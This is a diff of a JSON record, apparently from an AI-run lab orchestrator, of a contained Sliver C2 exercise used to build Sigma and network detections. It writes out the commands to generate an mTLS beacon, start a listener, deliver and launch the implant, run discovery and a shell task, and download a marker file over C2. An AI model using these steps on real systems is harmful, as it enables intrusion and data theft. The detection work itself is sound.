@@ -1,12 +1,13 @@
 {
   "scenario": {
-    "id": "bounded-http-beacon-foothold-and-host-survey",
-    "name": "Bounded HTTP C2 foothold and host survey",
+    "id": "bounded-mtls-beacon-foothold-survey-and-transfer",
+    "name": "Bounded mTLS C2 foothold, host survey, command execution, and small transfer",
     "reference": "scenarios.md",
-    "scope": "Generate and run one Windows beacon, establish contained HTTP C2 to Kali, perform bounded discovery and shell execution, and download one fixed non-host-data marker."
+    "scope": "Generate and run one Windows beacon, establish contained mTLS C2 only to Kali, perform bounded discovery and one benign shell task, and download one fixed non-host-data marker."
   },
   "environment": {
-    "topology": "Contained vmbr1 lab; no external C2 endpoint configured",
+    "topology": "Contained vmbr1 attacker/target lab; implant C2 configured only for Kali 192.168.1.50",
+    "proxmox_node": "analysis-proxmox",
     "attacker": {
       "vmid": 100,
       "name": "kalivm",
@@ -24,6 +25,23 @@
       "execution_account": "NT AUTHORITY\\SYSTEM",
       "execution_integrity": "System"
     },
+    "nsm": {
+      "vmid": 106,
+      "name": "nsm",
+      "address": "10.9.0.20",
+      "role": "Offline pcap analysis",
+      "zeek": {
+        "version": "8.2.1",
+        "ja3_source": "https://github.com/salesforce/ja3",
+        "ja3_commit": "502cc6395811c54743b0561419d61900a6df3ff7"
+      },
+      "suricata": {
+        "version": "7.0.10",
+        "ja3_support": true,
+        "et_open_alert_rules": 52234
+      },
+      "analysis_helper": "~/bin/nsm-analyze <local-pcap> <local-outdir>"
+    },
     "baseline_snapshot": "win_verify_baseline",
     "sensors": [
       {
@@ -32,15 +50,15 @@
         "service_status": "Running",
         "config_path": "C:\\Tools\\sysmon-verification.xml",
         "config_sha256": "5435642464A05B06B0AAD58C04E682336D0FBAA05786179FCA9292EAEA4F6D71",
-        "config_notes": [
-          "Unfiltered process creation, network connection, DNS, file, and registry telemetry.",
-          "Named-pipe events were in the requested sensor model, but this run produced zero EID 17/18 events."
-        ]
+        "config_notes": "Verification-grade process, network, DNS, file, registry, and deep Sysmon coverage"
       },
       {
         "name": "pktmon",
-        "configuration": "NIC components, all packets, full packet size, 64 MB circular capture",
-        "capture_path": "C:\\lab\\sliver-c2.pcapng"
+        "configuration": "All components, no filters, all packets, pkt-size 0, 512 MB circular ETL",
+        "etl_path": "C:\\Tools\\Logs\\sliver.etl",
+        "pcapng_path": "C:\\Tools\\Logs\\sliver.pcapng",
+        "packets_total": 3628,
+        "packets_dropped": 0
       }
     ],
     "defender": {
@@ -65,281 +83,276 @@
     },
     "implant": {
       "mode": "beacon",
-      "name": "sliver-verify-feasibility",
-      "target_path": "C:\\lab\\sliver-verify.exe",
-      "size_bytes": 36944384,
-      "sha256": "DEC80089EF9183F7E741E129D5744E7733BEE72C92E44F087C1A87F98883B622",
+      "name": "SLIVER-NSM",
+      "target_path": "C:\\lab\\sliver-nsm.exe",
+      "size_bytes": 34571264,
+      "sha256": "A0961CB48E51E2B898578658B4AC582D7816F8C65396D983617A82127F24BD9C",
       "os": "windows",
       "arch": "amd64",
       "format": "exe",
-      "c2_transport": "Sliver HTTP(S) transport using cleartext HTTP framing with Sliver application-layer encryption",
-      "c2_endpoint": "192.168.1.50:18080",
-      "beacon_interval_seconds": 5,
-      "jitter_seconds": 0,
-      "reconnect_interval_seconds": 60,
-      "max_connection_errors": 1000,
-      "http_c2_profile": "default",
-      "generation_command": "generate beacon --http 192.168.1.50:18080 --os windows --arch amd64 --format exe --name SLIVER-VERIFY-FEASIBILITY --seconds 5 --jitter 0 --save /tmp/sliver-verification/feasibility.exe"
+      "c2_transport": "Sliver mutually authenticated TLS over raw TCP",
+      "c2_endpoint": "192.168.1.50:31337",
+      "beacon_interval_seconds": 10,
+      "jitter_seconds": 3,
+      "generation_command": "generate beacon --mtls 192.168.1.50:31337 --os windows --arch amd64 --format exe --name SLIVER-NSM --seconds 10 --jitter 3 --save /tmp/sliver-nsm/sliver-nsm.exe"
     },
-    "listener_command": "http --lhost 192.168.1.50 --lport 18080",
-    "server_automation": "sliver-server --rc <command-script> for feasibility; isolated daemon plus loopback operator client for the canonical run",
-    "feasibility_checkpoint": {
-      "status": "passed before target access",
-      "listener_result": "Scripted console reported Successfully started job #1 and ss confirmed 192.168.1.50:18080 listening.",
-      "implant_result": "Scripted console generated the Windows beacon artifact and its SHA-256 was recorded.",
-      "state_isolation": "SLIVER_ROOT_DIR=/tmp/sliver-verification/state; pre-existing /root/.sliver data was not modified or removed."
+    "listener_command": "mtls --lhost 192.168.1.50 --lport 31337",
+    "automation": {
+      "server": "SLIVER_ROOT_DIR=/tmp/sliver-nsm/state sliver-server daemon --lhost 127.0.0.1 --lport 31338",
+      "client": "SLIVER_CLIENT_ROOT_DIR=/tmp/sliver-nsm/client sliver-client console --rc <script>",
+      "setup_result": "RC console started mTLS job 1 and generated the implant; ss confirmed only the contained listener plus loopback multiplayer port."
     },
     "deployment": {
-      "requested_helper_result": "lab-push could not target VM 104 because the installed helper invokes bash in the guest and Windows has no bash.exe; a large Kali lab-pull also exceeded the guest-agent response size.",
-      "contained_fallback": "A temporary Python HTTP server bound only to 192.168.1.50:18081 served feasibility.exe; VM 104 downloaded it with PowerShell Invoke-WebRequest, the target hash matched, and the staging server was immediately stopped.",
-      "target_command": "Invoke-WebRequest -UseBasicParsing -Uri http://192.168.1.50:18081/feasibility.exe -OutFile C:\\lab\\sliver-verify.exe"
+      "method": "Out-of-band Proxmox guest-agent transfer using lab-pull and Windows-capable lab-push",
+      "details": "The 34,571,264-byte artifact exceeded one-shot guest-agent and host argument limits. It was pulled from Kali in bounded chunks, split into 1,056 32 KiB chunks, pushed with lab-push, and reassembled on Windows by PowerShell.",
+      "integrity": "Kali, AI-VM reconstruction, and target SHA-256 all matched A0961CB4...24BD9C; no HTTP staging server was used."
     }
   },
   "flow": {
     "endpoint_collection_window": {
-      "start_utc": "2026-08-09T08:56:50.000Z",
-      "end_utc": "2026-08-09T09:07:15.709Z"
+      "start_utc": "2026-08-09T21:19:00.000Z",
+      "end_utc": "2026-08-09T21:36:07.241Z"
     },
     "packet_capture_window": {
-      "start_utc": "2026-08-09T08:57:17.360Z",
-      "end_utc": "2026-08-09T09:07:15.709Z"
+      "start_utc": "2026-08-09T21:32:59.2924878Z",
+      "end_utc": "2026-08-09T21:36:07.2405916Z"
     },
     "operator_actions": [
       {
-        "at_utc": "2026-08-09T08:56:51.961Z",
-        "action": "Deliver implant from the contained Kali staging endpoint",
-        "command": "Invoke-WebRequest -UseBasicParsing -Uri http://192.168.1.50:18081/feasibility.exe -OutFile C:\\lab\\sliver-verify.exe",
-        "result": "success; target SHA-256 matched DEC80089...B622"
+        "at_utc": "2026-08-09T21:32:23.792Z",
+        "action": "Complete out-of-band implant delivery",
+        "command": "lab-push 104 <32-KiB-part> C:/lab/sliver-push32/<part>; reassemble C:\\lab\\sliver-nsm.exe",
+        "result": "success; target SHA-256 matched"
       },
       {
-        "at_utc": "2026-08-09T08:57:17.388Z",
+        "at_utc": "2026-08-09T21:32:59.292Z",
+        "action": "Start full-packet capture",
+        "command": "pktmon start --capture --pkt-size 0 -f C:\\Tools\\Logs\\sliver.etl",
+        "result": "all components, no filters, all packets, zero lost events"
+      },
+      {
+        "at_utc": "2026-08-09T21:32:59.362Z",
         "action": "Launch implant",
-        "command": "Start-Process -FilePath C:\\lab\\sliver-verify.exe -WorkingDirectory C:\\lab -PassThru",
-        "result": "success; PID 2292 as NT AUTHORITY\\SYSTEM"
+        "command": "Start-Process C:\\lab\\sliver-nsm.exe",
+        "result": "success; PID 6088 as NT AUTHORITY\\SYSTEM"
       },
       {
-        "at_utc": "2026-08-09T08:57:17Z",
+        "at_utc": "2026-08-09T21:32:59Z",
         "action": "Confirm beacon",
         "command": "beacons",
-        "result": "beacon abaa09a9, HTTP(S), win10-analysis, first contact 08:57:17Z"
+        "result": "beacon 3f34cfec, mTLS, win10-analysis, PID 6088"
       },
       {
-        "at_utc": "2026-08-09T09:01:01Z",
-        "action": "Account discovery",
-        "command": "whoami",
-        "result": "success; current token NT AUTHORITY\\SYSTEM"
+        "at_utc": "2026-08-09T21:34:17Z",
+        "action": "Account and system discovery",
+        "command": "getuid; info",
+        "result": "S-1-5-18/SYSTEM; Windows 10 build 19044 amd64; 10s interval and 3s jitter"
       },
       {
-        "at_utc": "2026-08-09T09:01:26Z",
-        "action": "System and beacon information",
-        "command": "info",
-        "result": "success; Windows 10 build 19044 amd64, PID 2292, interval 5s, jitter 0s"
+        "at_utc": "2026-08-09T21:34:17Z",
+        "action": "Directory and process discovery",
+        "command": "ls C:\\\\lab; ps",
+        "result": "tasks completed at 21:34:33Z"
       },
       {
-        "at_utc": "2026-08-09T09:01:28Z",
-        "action": "Working-directory discovery",
-        "command": "pwd",
-        "result": "success; C:\\lab"
+        "at_utc": "2026-08-09T21:34:17Z",
+        "action": "One benign command execution",
+        "command": "execute C:\\\\Windows\\\\System32\\\\cmd.exe -- /c \"echo SLIVER_NSM_MARKER>C:\\\\lab\\\\sliver-nsm-marker.txt\"",
+        "result": "completed at 21:34:33Z; cmd.exe child and 19-byte file observed"
       },
       {
-        "at_utc": "2026-08-09T09:01:59Z",
-        "action": "Directory discovery",
-        "command": "ls C:\\lab",
-        "result": "task completed; the client parsed the argument as C:lab and returned an empty listing"
+        "at_utc": "2026-08-09T21:34:17Z",
+        "action": "Download fixed marker over C2",
+        "command": "download C:\\\\lab\\\\sliver-nsm-marker.txt /tmp/sliver-nsm/downloaded-marker.txt",
+        "result": "Sliver task a95c9862 completed at 21:34:33Z with a 58-byte response; source marker SHA-256 7CCD614DB42F462F36464E32F4CDA4C481DB8FE45054C2967032FF579AEBF405"
       },
       {
-        "at_utc": "2026-08-09T09:02:21Z",
-        "action": "Process discovery",
-        "command": "ps",
-        "result": "success; output included the beacon PID and reported Sysmon64 and Windows Defender"
-      },
-      {
-        "at_utc": "2026-08-09T09:02:43Z",
-        "action": "Benign shell execution quoting tests",
-        "command": "execute with single-backslash or forward-slash cmd.exe paths",
-        "result": "four bounded attempts through 09:04:21Z failed with path or cmd syntax errors; three cmd.exe child processes were still recorded"
-      },
-      {
-        "at_utc": "2026-08-09T09:05:39Z",
-        "action": "Benign command execution",
-        "command": "execute C:\\\\Windows\\\\System32\\\\cmd.exe -- /c whoami",
-        "result": "success; output nt authority\\system"
-      },
-      {
-        "at_utc": "2026-08-09T09:06:12Z",
-        "action": "Create fixed transfer marker through implant-spawned shell",
-        "command": "execute C:\\\\Windows\\\\System32\\\\cmd.exe -- /c \"echo SLIVER_VERIFICATION_MARKER>C:\\\\lab\\\\sliver-proof.txt\"",
-        "result": "success; created a 28-byte marker containing only fixed test text"
-      },
-      {
-        "at_utc": "2026-08-09T09:06:36Z",
-        "action": "Download marker over C2",
-        "command": "download C:\\\\lab\\\\sliver-proof.txt /tmp/sliver-verification/sliver-proof-downloaded.txt",
-        "result": "success; 28 bytes; SHA-256 497A9EE0E13149E84345E631BE2AF580832FEBBEFEA60652FAF2273617B264E"
+        "at_utc": "2026-08-09T21:36:07.241Z",
+        "action": "Stop and convert packet capture",
+        "command": "pktmon stop; pktmon pcapng C:\\Tools\\Logs\\sliver.etl -o C:\\Tools\\Logs\\sliver.pcapng",
+        "result": "3,628 packets formatted; zero drops"
       }
     ]
   },
   "observed_techniques": [
     {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "observation": "The implant was transferred from the contained Kali host to C:\\lab; Sysmon recorded the PowerShell EID 3 staging connection and EID 11 executable write."
-    },
-    {
-      "id": "T1071.001",
-      "name": "Application Layer Protocol: Web Protocols",
-      "observation": "The beacon used HTTP framing to the contained listener and Sysmon recorded 213 attributed outbound TCP connections."
-    },
-    {
       "id": "T1573.002",
       "name": "Encrypted Channel: Asymmetric Cryptography",
-      "observation": "Sliver application-layer encrypted payloads were carried inside the HTTP transport; packet evidence retained only framing and flow metadata."
+      "observation": "The beacon used mutually authenticated TLS 1.3; Zeek and Suricata extracted matching JA3/JA3S fingerprints."
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "observation": "The exact generated implant was transferred out of band into C:\\lab and its hash was verified before execution."
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
-      "observation": "whoami returned the current SYSTEM token identity."
+      "observation": "getuid returned the SYSTEM SID."
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
-      "observation": "info returned the Windows version, architecture, locale, and implant process identity."
+      "observation": "info returned Windows build, architecture, locale, process, and beacon configuration."
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
-      "observation": "pwd and ls tasks completed; pwd returned C:\\lab while ls produced an empty listing after client path normalization."
+      "observation": "ls tasked directory discovery for C:\\lab."
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
-      "observation": "ps returned the target process list and identified security products."
+      "observation": "ps completed process discovery."
     },
     {
       "id": "T1059.003",
       "name": "Command and Scripting Interpreter: Windows Command Shell",
-      "observation": "The implant directly spawned cmd.exe; the parser-safe whoami and marker-write commands completed successfully."
+      "observation": "The implant directly spawned cmd.exe for the fixed benign marker command."
     },
     {
       "id": "T1041",
       "name": "Exfiltration Over C2 Channel",
-      "observation": "Sliver downloaded the fixed 28-byte marker over the established C2 channel."
+      "observation": "A fixed 19-byte non-host-data marker was downloaded over the mTLS C2 channel."
+    }
+  ],
+  "not_observed_techniques": [
+    {
+      "id": "T1071.001",
+      "name": "Application Layer Protocol: Web Protocols",
+      "reason": "The selected transport was raw mTLS, not HTTPS; Zeek produced no http.log."
+    },
+    {
+      "id": "T1071.004",
+      "name": "Application Layer Protocol: DNS",
+      "reason": "The implant used a literal IP mTLS endpoint and produced no implant-attributed DNS query."
     }
   ],
   "observed_signals": {
     "network_and_dns": {
-      "event_ids": [3, 22],
-      "status": "observed network; no implant DNS",
-      "details": "Sysmon recorded 213 implant-attributed initiated TCP connections from 192.168.1.52 to 192.168.1.50:18080 between 08:57:17Z and 09:07:10Z. The literal-IP C2 generated zero implant EID 22 DNS queries. One separate PowerShell EID 3 connection to the temporary contained staging port 18081 was observed."
+      "endpoint": "Sysmon EID 3 attributed 18 initiated TCP connections to the implant; no implant EID 22 query occurred.",
+      "nsm": "Zeek and Suricata parsed 18 TLS 1.3 flows with JA3 2196848d251b217de8b2c037e356c11d and JA3S f4febc55ea12b31ae17cfb7e614afda8. No SNI, HTTP, hostname C2, or passively visible C2 x509 chain was present.",
+      "jarm": "Active NSM measurement returned all-zero JARM because generic probes could not complete client-authenticated mTLS.",
+      "periodicity": "After excluding the one-second startup pair, 16 Zeek flow-start gaps ranged 10.043–12.786 seconds (median 11.319, stdev 0.913), matching the configured 10-second interval plus up to 3 seconds jitter.",
+      "suricata": "No ET Open Sliver/content rule fired; only invalid-checksum decoder events caused by pktmon/checksum offload were present."
     },
     "files": {
-      "event_ids": [11, 23, 26],
       "status": "observed",
-      "details": "EID 11 recorded PowerShell writing C:\\lab\\sliver-verify.exe, Windows creating SLIVER-VERIFY.EXE-51525AC4.pf, and implant-spawned cmd.exe creating C:\\lab\\sliver-proof.txt. No related EID 23 or 26 was observed."
+      "details": "EID 11 recorded PowerShell writing the implant, Windows writing its Prefetch artifact, and implant-spawned cmd.exe writing the fixed marker. No related EID 23/26 delete occurred."
     },
     "registry": {
-      "event_ids": [12, 13, 14],
-      "status": "observed but nonspecific",
-      "details": "The implant ProcessGuid produced ten EID 12 CreateKey events under Internet Settings\\Connections and TenantRestrictions\\Payload during HTTP initialization. No implant-attributed EID 13 or 14 was observed. These common Windows networking/policy paths were too nonspecific for a useful Sigma rule."
+      "status": "not observed for implant",
+      "details": "No EID 12/13/14 event carried the implant ProcessGuid."
     },
     "process_identity_and_command": {
-      "event_ids": [1],
       "status": "observed",
-      "details": "EID 1 recorded the generated implant, absent PE identity metadata, path, hash, SYSTEM context, and PowerShell parent. Five cmd.exe children were recorded; the final two parser-safe commands succeeded."
+      "details": "EID 1 recorded the generated implant with absent PE identity metadata, its SHA-256, SYSTEM context, and PowerShell parent; the benign cmd.exe command line was also captured."
     },
     "parent_child": {
-      "event_ids": [1, 17, 18],
-      "status": "observed process parent-child; no named pipes",
-      "details": "EID 1 recorded C:\\lab\\sliver-verify.exe directly spawning cmd.exe for execute tasks. The HTTP-beacon flow produced zero Sysmon EID 17/18 named-pipe events."
+      "status": "observed process parent-child; no Tier 2 named pipes",
+      "details": "EID 1 recorded sliver-nsm.exe directly spawning cmd.exe. No EID 17/18 named-pipe event or implant-attributed EID 10 process-access event occurred."
     }
   },
   "telemetry_summary": {
-    "sysmon_total": 7942,
-    "relevant_counts": {
-      "implant_process_creation": 1,
-      "implant_child_process_creation": 5,
-      "implant_c2_network_connections": 213,
+    "endpoint": {
+      "total_events": 77811,
+      "sysmon_events": 72244,
+      "implant_process_creations": 1,
+      "implant_child_process_creations": 1,
+      "implant_network_connections": 18,
       "implant_dns_queries": 0,
       "related_file_creates": 3,
-      "implant_registry_events": 10,
+      "implant_registry_events": 0,
       "implant_named_pipe_events": 0
     },
-    "pcap": {
-      "bytes": 1382868,
-      "sha256": "DF01616882DC1B1D966C8BE9376D13D60570B603A124AEDA93A7AC715946E57F",
-      "filtered_c2_packets": 1931,
-      "client_syn_packets": 188,
+    "network": {
+      "pcap_bytes": 812176,
+      "pcap_sha256": "991FD2155275598D174B04A1EC6EDB67C6B38EF5285DF0FBAE6118794FA037C0",
+      "packets": 3628,
+      "drops": 0,
+      "zeek_c2_connections": 18,
+      "suricata_tls_events": 18,
       "raw_committed": false
     }
   },
   "evidence": [
     {
-      "path": "evidence/multidimensional-signals.json",
-      "event_ids": [1, 3, 11, 12, 13, 14, 17, 18, 22, 23, 26],
-      "description": "Sanitized Sysmon fields, counts, and representative events for all five observation dimensions."
+      "path": "evidence/endpoint-signals.json",
+      "description": "Sanitized fields and counts for all five endpoint observation dimensions."
     },
     {
-      "path": "evidence/pcap-summary.json",
-      "description": "Sanitized packet-flow and HTTP-profile counts plus capture hash; excludes cookies, tokens, randomized URIs, and payloads."
+      "path": "evidence/network-signals.json",
+      "description": "Sanitized Zeek, Suricata, JA3/JA3S, JARM, TLS, DNS, alert, and aggregate timing evidence."
     }
   ],
   "sigma": [
     {
       "path": "sigma/proc_creation_unversioned_executable_from_script_host.yml",
-      "tier": 1,
+      "tier": "endpoint_tier_1",
       "logsource": "windows/process_creation",
       "status": "experimental"
     },
     {
-      "path": "sigma/proc_creation_untrusted_parent_spawns_shell_or_lolbin.yml",
-      "tier": 1,
+      "path": "sigma/proc_creation_untrusted_parent_spawns_shell.yml",
+      "tier": "endpoint_tier_1",
       "logsource": "windows/process_creation",
       "status": "experimental"
     },
     {
       "path": "sigma/file_event_script_host_writes_executable.yml",
-      "tier": 1,
+      "tier": "endpoint_tier_1",
       "logsource": "windows/file_event",
       "status": "experimental"
     },
     {
-      "path": "sigma/network_connection_non_browser_web_egress.yml",
-      "tier": 1,
-      "logsource": "windows/network_connection",
+      "path": "sigma/network_zeek_sliver_mtls_ja3_pair.yml",
+      "tier": "network_tier_1",
+      "logsource": "zeek/tls",
       "status": "experimental"
     },
     {
-      "path": "sigma/pipe_created_executable_from_user_writable_path.yml",
-      "tier": 2,
-      "logsource": "windows/sysmon/pipe_created",
-      "status": "experimental",
-      "observation": "Not exercised; retained as a behavior-based future pivot-C2 rule."
+      "path": "sigma/network_suricata_sliver_mtls_ja3_pair.yml",
+      "tier": "network_tier_1",
+      "logsource": "suricata/tls",
+      "status": "experimental"
+    },
+    {
+      "path": "sigma/network_zeek_tls13_no_sni_no_visible_cert.yml",
+      "tier": "network_tier_2_hunt",
+      "logsource": "zeek/tls",
+      "status": "experimental"
     }
   ],
   "detection_limitations": [
-    "The Tier 1 network Sigma rule represents one outbound connection and cannot express periodic-beacon correlation by itself.",
-    "Robust Sliver C2 detection needs network IDS/NSM telemetry such as Suricata or Zeek for flow periodicity, HTTP-profile analysis, and JA3/JARM when TLS or mTLS is used. This lab currently has pktmon packet capture but no persistent Suricata/Zeek sensor.",
-    "JA3/JARM were not available for this cleartext-HTTP-framed run. Sliver's application payload remained encrypted even though HTTP headers were observable.",
-    "Generated names, hashes, URI paths, headers, and transport profiles are operator-configurable; no committed Sigma rule relies on the lab C2 address or the generated implant identity."
+    "Generated names, hashes, ports, transport profiles, and TLS stacks are operator- or version-dependent; no rule hardcodes the lab address or port.",
+    "JA3/JA3S can overlap with other Go software and can change across Sliver/Go versions; use the pair plus periodicity and endpoint context.",
+    "Single-event Sigma cannot express the observed 10+0–3 second flow periodicity; an analytics layer must aggregate by endpoint pair and fingerprint.",
+    "TLS 1.3 mTLS exposed no passive certificate chain/x509 row in this trace, and JARM was all-zero because generic probes could not authenticate.",
+    "The broad no-SNI/no-visible-cert Zeek rule is intentionally a low-level hunt and requires aggregation/tuning."
   ],
   "sanitization": {
     "raw_evtx_committed": false,
+    "raw_etl_committed": false,
     "raw_pcap_committed": false,
-    "c2_tokens_or_cookies_committed": false,
+    "raw_zeek_or_eve_committed": false,
+    "implant_committed": false,
+    "c2_state_or_operator_config_committed": false,
+    "certificates_or_private_keys_committed": false,
+    "tokens_cookies_or_secrets_committed": false,
     "host_file_contents_committed": false,
-    "marker_content": "SLIVER_VERIFICATION_MARKER only",
-    "notes": "Only detection-relevant telemetry fields and aggregate packet metadata are committed. The raw pcap contained ephemeral C2 cookie material and was excluded."
+    "notes": "Only detection-relevant endpoint fields, TLS fingerprints, JARM result, NSM versions, alert summaries, and aggregate flow metadata are committed."
   },
   "validation": {
-    "pysigma": "All five rules parsed successfully with pySigma on 2026-08-09.",
-    "json": "verification.json and both evidence JSON files passed jq validation on 2026-08-09."
+    "pysigma": "All six Sigma rules parsed successfully with pySigma 1.5.0 on 2026-08-09.",
+    "json": "verification.json and both sanitized evidence JSON files passed jq validation on 2026-08-09."
   },
   "cleanup": {
-    "confirmed_at": "2026-08-09T09:28:23Z",
-    "attacker": "Stopped the isolated Sliver client/server and listeners; confirmed TCP 18080, 18081, and 31338 closed; deleted /tmp/sliver-verification; preserved pre-existing /root/.sliver state.",
-    "target": "Proxmox rollback to win_verify_baseline completed with exitstatus OK; confirmed the implant, marker, pcap, telemetry directories, evidence extract, and Sliver process were absent after startup.",
-    "baseline_health": "Sysmon64 was Running with config SHA-256 5435642464A05B06B0AAD58C04E682336D0FBAA05786179FCA9292EAEA4F6D71; Defender real-time and behavior monitoring remained off as defined by the baseline."
+    "status": "confirmed",
+    "confirmed_at": "2026-08-09T21:57:00Z",
+    "attacker": "Stopped the isolated Sliver server/listener; confirmed no Sliver process and no listeners on TCP 31337/31338; deleted /tmp/sliver-nsm including implant, server/client assets, C2 database, operator profile, certificates/keys, chunks, scripts, and logs; preserved pre-existing /root/.sliver state.",
+    "target": "Proxmox rollback of VM 104 to win_verify_baseline completed with exitstatus OK. After startup, confirmed the implant, marker, pcap, ETL, telemetry exports, push chunks, helper scripts, and implant process were absent and pktmon was stopped.",
+    "baseline_health": "Sysmon64 15.21 was Running with config SHA-256 5435642464A05B06B0AAD58C04E682336D0FBAA05786179FCA9292EAEA4F6D71; Defender real-time, behavior monitoring, and tamper protection remained off as defined by the baseline."
   },
-  "verified_at": "2026-08-09T09:07:15Z",
+  "verified_at": "2026-08-09T21:36:07Z",
   "verifier": "Codex lab orchestrator"
 }
